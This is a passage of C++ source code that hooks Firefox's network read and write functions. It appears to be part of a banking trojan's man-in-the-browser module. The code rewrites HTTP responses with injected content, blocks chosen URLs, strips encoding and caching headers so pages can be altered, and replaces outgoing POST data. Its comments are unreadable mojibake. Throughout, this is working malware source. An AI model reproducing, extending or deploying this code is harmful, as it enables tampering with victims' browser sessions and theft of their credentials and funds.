                if(HttpGrabber::_executeInjects(nc->url, (LPBYTE *)&content, &contentSize, nc->injects, nc->injectsCount))
                {
#                 if defined WDEBUG1
                  WDEBUG1(WDDT_INFO, "Injects accepted, contentSize=%u.", contentSize);
#                 endif                  
                  //������������ ���������.
                  LPBYTE newResponse = (LPBYTE)Mem::alloc(nc->responseSize - (info.contentEndOffset - info.contentOffset) + contentSize
                                                          + 11 + 2 + 2/*Content-Length, chunk*/
                                                          + 1 + 2 + 2/*final chunk*/);
                  if(newResponse != NULL)
                  {
                    LPBYTE p = newResponse;
                    Mem::_copy(newResponse, nc->response, info.contentOffset);
                    
                    if(info.flags & HRIF_DEFINED_CHUNKED)
                    {
                      p += info.contentOffset;
                      p += Str::_sprintfA((LPSTR)p, 13, "%x\r\n", contentSize);
                      p  = (LPBYTE)Mem::_copy2(p, content, contentSize);
                      p  = (LPBYTE)Mem::_copy2(p, "\r\n0\r\n\r\n", 7);
                    }
                    else
                    {
                      char numStr[11];
                      Str::_FromInt32A(contentSize, numStr, 10, false);
                      p += HttpTools::_modifyMimeHeader(newResponse, info.contentOffset, "Content-Length", numStr);
                      p  = (LPBYTE)Mem::_copy2(p, content, contentSize);
                    }

                    //��������, �������.
                    if(info.contentEndOffset != nc->responseSize)
                    {
#                     if defined WDEBUG1
                      WDEBUG1(WDDT_WARNING, "Response postfix detected, size=%u", nc->responseSize - info.contentEndOffset);
#                     endif
                      
                      p = (LPBYTE)Mem::_copy2(p, nc->response + info.contentEndOffset, nc->responseSize - info.contentEndOffset);
                    }
                    
                    //��������� �������.
                    Mem::free(nc->response);
                    nc->response     = newResponse;
                    nc->responseSize = (DWORD)(p - newResponse);
                  }
                }
#               if(BO_DEBUG > 0) && defined WDEBUG0
                else WDEBUG0(WDDT_WARNING, "Injects not accepted.");
#               endif

                analizeResult = -1;
                Mem::free(content);
              }
            }

            //��������� ��� �� ��������.
            if(readed > 0 && analizeResult == 0)
            {
#             if defined WDEBUG0
              WDEBUG0(WDDT_INFO, "Response not recived, blocking caller.");
#             endif

              prSetError(-5998L/*PR_WOULD_BLOCK_ERROR*/, 0);
              readed = -1;
            }            
            //������ �������� ��� �������� �������.
            else if(readed == 0 || analizeResult == -1)
            {
#             if defined WDEBUG2
              WDEBUG2(WDDT_INFO, "Analize finished, readed=%i, analizeResult=%i", readed, analizeResult);
#             endif
              
              nc->pendingResponse.buf  = nc->response;
              nc->pendingResponse.size = nc->responseSize;
              nc->pendingResponse.pos  = 0;

              nc->response     = NULL;
              nc->responseSize = 0;

              HttpGrabber::_freeInjectFullDataList(nc->injects, nc->injectsCount);
              nc->injectsCount = 0;
              nc->injects      = NULL;

              goto sendPendingData;
            }
          }
          CWA(kernel32, LeaveCriticalSection)(&connectionsCs);        
        }
        return readed;
      }
    }
    CWA(kernel32, LeaveCriticalSection)(&connectionsCs);
  }
  return prRead(fd, buf, amount);
}

__int32 __cdecl Nspr4Hook::hookerPrWrite(void *fd, const void *buf, __int32 amount)
{
#if defined WDEBUG1
  WDEBUG1(WDDT_INFO, "Called, amount=%i.", amount);
#endif

  if(Core::isActive() && buf != NULL && amount > 0)
  {
    /*
      � ������ ����� ������ ���� ��������.
    */
    CWA(kernel32, EnterCriticalSection)(&connectionsCs);
    DWORD connectionIndex = connectionFind((PRFILEDESC *)fd);
    if(connectionIndex != (DWORD)-1)
    {
      NSPR4CONNECTION *nc = &connections[connectionIndex];
#     if defined WDEBUG1
      WDEBUG1(WDDT_INFO, "Connection 0x%p founded in table.", fd);
#     endif
      
      //������ ����������� ������ ����� �������������, ������� �� ���� ���������� ��� ������� ������ PR_Write().
      //������ �������� ��������� ��� ����������� �������.
      if(nc->pendingRequest.size > 0)
      {
sendPendingData:
        LPBYTE p      = (LPBYTE)nc->pendingRequest.buf + nc->pendingRequest.pos;
        __int32 size  = nc->pendingRequest.size - nc->pendingRequest.pos;

#       if defined WDEBUG3
        WDEBUG3(WDDT_INFO, "Pending data detected, nc->pendingRequest.size=%u, nc->pendingRequest.pos=%u, size=%u", nc->pendingRequest.size, nc->pendingRequest.pos, size);
#       endif        
        
        CWA(kernel32, LeaveCriticalSection)(&connectionsCs);
        __int32 count = prWrite(fd, p, size);

        if(count != -1)
        {
#         if defined WDEBUG1
          WDEBUG1(WDDT_INFO, "Writed %i bytes of pending data.", count);
#         endif

          //��������� ���������.
          CWA(kernel32, EnterCriticalSection)(&connectionsCs);
          if((connectionIndex = connectionFind((PRFILEDESC *)fd)) == (DWORD)-1)
          {
#           if defined WDEBUG0
            WDEBUG0(WDDT_ERROR, "Fatal error.");
#           endif            

            count = -1;
            prSetError(-6000L/*PR_OUT_OF_MEMORY_ERROR*/, ERROR_NOT_ENOUGH_MEMORY);
          }
          else
          {
            nc = &connections[connectionIndex];

            //��� ����������.
            if(count == size)
            {
              count = nc->pendingRequest.realSize;
              Mem::free(nc->pendingRequest.buf);

#             if defined WDEBUG1
              WDEBUG1(WDDT_INFO, "All pending data sended, nc->pendingRequest.realSize=%u.", nc->pendingRequest.realSize);
#             endif

              Mem::_zero(&nc->pendingRequest, sizeof(nc->pendingRequest));
            }
            //���������� ��������.
            else
            {
              nc->pendingRequest.pos += count;
              nc->pendingRequest.realSize--; //��� ������� ���, ��.
              count = 1;

#             if defined WDEBUG2
              WDEBUG2(WDDT_INFO, "Not all pending data sended, nc->pendingRequest.pos=%u, nc->pendingRequest.realSize=%u.", nc->pendingRequest.pos, nc->pendingRequest.realSize);
#             endif
            }
          }
          CWA(kernel32, LeaveCriticalSection)(&connectionsCs);
        }
#       if(BO_DEBUG > 0) && defined WDEBUG1
        else WDEBUG1(WDDT_WARNING, "Failed to send pending data, PR_GetError()=%i.", prGetError());
#       endif

        return count;
      }

      //��������� ������� ���� ����� ���������� �� ������� �������.
      //������ �������� ��������� ��� ����������� �������, �.�. ���� �� ��� ������� ������.
      if(nc->writeBytesToSkip > 0)
      {
sendSkippedData:

#       if defined WDEBUG1
        WDEBUG1(WDDT_INFO, "Bytes to skip detected, nc->writeBytesToSkip=%u.",nc->writeBytesToSkip);
#       endif

        CWA(kernel32, LeaveCriticalSection)(&connectionsCs);
        __int32 count = prWrite(fd, buf, amount);

        if(count != -1)
        {
#         if defined WDEBUG1
          WDEBUG1(WDDT_INFO, "Writed %i bytes of skipped bytes.", count);
#         endif

          //��������� ���������.
          CWA(kernel32, EnterCriticalSection)(&connectionsCs);
          if((connectionIndex = connectionFind((PRFILEDESC *)fd)) == (DWORD)-1)
          {
#           if defined WDEBUG0
            WDEBUG0(WDDT_ERROR, "Fatal error.");
#           endif

            count = -1;
            prSetError(-6000L/*PR_OUT_OF_MEMORY_ERROR*/, ERROR_NOT_ENOUGH_MEMORY);
          }
          else
          {
            nc = &connections[connectionIndex];

            if((DWORD)count <= nc->writeBytesToSkip)
            {
              nc->writeBytesToSkip -= (DWORD)count;

#             if defined WDEBUG1
              WDEBUG1(WDDT_INFO, "writeBytesToSkip=%u.", nc->writeBytesToSkip);
#             endif
            }
            else
            {
              //�.�. ���� ������� ����� ������������� ����������� ���� �� ������, �� �������� �����.
              connectionRemove(connectionIndex);

#             if defined WDEBUG3
              WDEBUG3(WDDT_ERROR, "Protocol error detected, fd=0x%p, count=%i, writeBytesToSkip=%u.", fd, count, nc->writeBytesToSkip);
#             endif
            }
          }
          CWA(kernel32, LeaveCriticalSection)(&connectionsCs);
        }
#       if(BO_DEBUG > 0) && defined WDEBUG1
        else WDEBUG1(WDDT_WARNING, "Failed to send skipped bytes, PR_GetError()=%i.", prGetError());
#       endif

        return count;
      }

      //��� ����� ������.
      {
        //�������� ������ �������. Firefox ������ �������� �� ��� ������ ����� HTTP-����������, �������
        //����������� ������ ���������� �� �����.
        HttpGrabber::REQUESTDATA requestData;
        DWORD result = fillRequestData(&requestData, (PRFILEDESC *)fd, buf, amount);

#       if defined WDEBUG1
        WDEBUG1(WDDT_INFO, "New request detected, fillRequestData()=%u.",result);
#       endif        

        //������ ������������, ���������� ����������.
        if(result == (DWORD)-1)
        {
          connectionRemove(connectionIndex);

#         if defined WDEBUG0
          WDEBUG0(WDDT_ERROR, "Protocol error detected.");
#         endif        
        }
        else 
        {
          //������ ����������, �� �� ��� �� ���������.
          if(requestData.handle == NULL)
          {
#           if defined WDEBUG0
            WDEBUG0(WDDT_INFO, "Request skipped.");
#           endif
          }
          //������ ���������, ���������� �� ������.
          else
          {
            DWORD analizeResult = HttpGrabber::analizeRequestData(&requestData);
            
            if(analizeResult & HttpGrabber::ANALIZEFLAG_URL_BLOCKED)
            {
              HttpGrabber::_freeRequestData(&requestData);
              CWA(kernel32, LeaveCriticalSection)(&connectionsCs);
              prSetError((-5981L)/*PR_CONNECT_REFUSED_ERROR*/, 0);
              return -1;
            }
            else
            {
              void *newRequest     = NULL;
              DWORD newRequestSize = 0;

              if(analizeResult & HttpGrabber::ANALIZEFLAG_URL_INJECT)// || true)
              {
                if((newRequest = Mem::copyEx(buf, amount)) == NULL)
                {
                  HttpGrabber::_freeInjectFullDataList(requestData.injects, requestData.injectsCount);
                }
                else
                {
                  //FIXME: Pipeline, �.�. ����  nc->injects ������ ��������.
                  //������ ������� ���� �����������.
                  HttpGrabber::_freeInjectFullDataList(nc->injects, nc->injectsCount);
                  Mem::free(nc->response);

                  Mem::free(nc->url);
                  nc->url = Str::_CopyExA(requestData.url, requestData.urlSize);

#                 if(BO_DEBUG > 0) && defined WDEBUG0
                  if(nc->injects != NULL)WDEBUG0(WDDT_WARNING, "(nc->injects != NULL) == true");
#                 endif

                  nc->injects      = requestData.injects;
                  nc->injectsCount = requestData.injectsCount;
                  nc->response     = NULL;
                  nc->responseSize = 0;

                  //������� ���������.
                  newRequestSize = amount;                    
                  newRequestSize = HttpTools::_modifyMimeHeader(newRequest, newRequestSize, "Accept-Encoding", "identity");//FIXME: ��������, ���� �� ���������.
                  newRequestSize = HttpTools::_removeMimeHeader(newRequest, newRequestSize, "TE");
                  newRequestSize = HttpTools::_removeMimeHeader(newRequest, newRequestSize, "If-Modified-Since"); //����������� ������� �� ����.
                }
              }

              if(analizeResult & HttpGrabber::ANALIZEFLAG_POSTDATA_REPLACED)
              {
                void *oldRequest;
                __int32 oldRequestSize;

                if(newRequest == NULL)
                {
                  oldRequest     = (void *)buf;
                  oldRequestSize = amount;
                }
                else
                {
                  oldRequest     = newRequest;
                  oldRequestSize = newRequestSize;
                }
                
                newRequestSize = replacePostData(oldRequest, oldRequestSize, requestData.postData, requestData.postDataSize, &newRequest);
                Mem::free(requestData.postData);

                if(newRequestSize == 0)
                {
                  if(oldRequest == buf)
                  {
                    newRequest = NULL;
                  }
                  else 
                  {
                    newRequest     = oldRequest;
                    newRequestSize = oldRequestSize;
                  }
                }
                else
                {
                  if(oldRequest != buf)
                  {
                    Mem::free(oldRequest);
                  }
                }
              }

              //��������� ������. ������ ��������������.
              if(newRequest != NULL)
              {
                HttpGrabber::_freeRequestData(&requestData);
                
#               if defined WDEBUG2
                WDEBUG2(WDDT_INFO, "Request changed, newRequestSize=%u, nc->pendingRequest.realSize=%u.", newRequestSize, amount);
#               endif

                nc->writeBytesToSkip        = result;
                nc->pendingRequest.buf      = newRequest;
                nc->pendingRequest.size     = newRequestSize;
                nc->pendingRequest.pos      = 0;
                nc->pendingRequest.realSize = amount;
                goto sendPendingData;
              }
            }
          }

          HttpGrabber::_freeRequestData(&requestData);
          nc->writeBytesToSkip = result + amount;
          goto sendSkippedData;
        }

        HttpGrabber::_freeRequestData(&requestData);
      }      
    }
    CWA(kernel32, LeaveCriticalSection)(&connectionsCs);
  }

  return prWrite(fd, buf, amount);
}
#endif
